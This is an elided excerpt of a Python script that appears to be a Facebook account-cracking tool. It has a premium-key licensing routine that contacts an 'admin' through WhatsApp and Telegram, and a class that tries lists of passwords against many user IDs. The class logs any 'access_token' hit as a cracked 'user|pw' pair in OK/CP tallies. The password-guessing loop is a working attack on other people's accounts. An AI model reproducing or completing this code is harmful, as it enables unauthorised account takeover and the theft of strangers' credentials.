...
def reg():
    ...
    try:
        ...
        reg2()
    r = requests.get('https://github.com/Max-fro-man/EMRAN-AFROBAL/blob/main/Afroveal.txt').text
    if to in r:
        time.sleep(2)
        bsn_menu()
    else:
        os.system('clear')
        os.system('xdg-open https://t.me/+BsqxB3iF8rZkZDE0')
        logo()
        print('')
        ...
        print("               COPY AND SEND KEY TO ADMIN EMRAN ")
...
def reg2():
    ...
    input('\033[1;97m               PRESS ENTER  TO SEND TOKEN')
    time.sleep(3.5)
    tks = 'Dear%20EHC-sir,%20Please%20Approved%20My%20Key%20To%20Premium%20%20Thanks%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Name%20:%20'+name+'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20%20Key%20%20:%20'+id
    os.system('am start https://wa.me/9710569549857?text=' + tks)
...
def bsn_menu():
    ...
    IP = ipm["origin"]
    print("             [*]. CREATED BY : EHC EMRAN CYBER [99] ");time.sleep (0.03)
    print("             [*]. FACEBOOK   : EMRAN HOSSAIN");time.sleep (0.03)
    print("             [*]. GITHUB     : MAX FRO MAN ");time.sleep (0.03)   
...
class __bsn__:
        ...
        for pw in __chi__:
            ...
            if "access_token" in p:
                ...
                try:
                    ...
                    print('\r%s \033[1;91m[CP-EHC] %s | %s ' % (K,user,pw))
                    wrt = '%s|%s' % (user,pw)
                    cp.append(wrt)
    ...
    def __metode__(self, user, __chi__, cebok):
        global ok,cp,loop
        sys.stdout.write(f'\r [EHC] {loop}/{len(self.id)} -- OK:- {len(ok)} - CP:- {len(cp)} '),
        sys.stdout.flush()
        try:
            for pw in __chi__:
                pw = pw.lower()
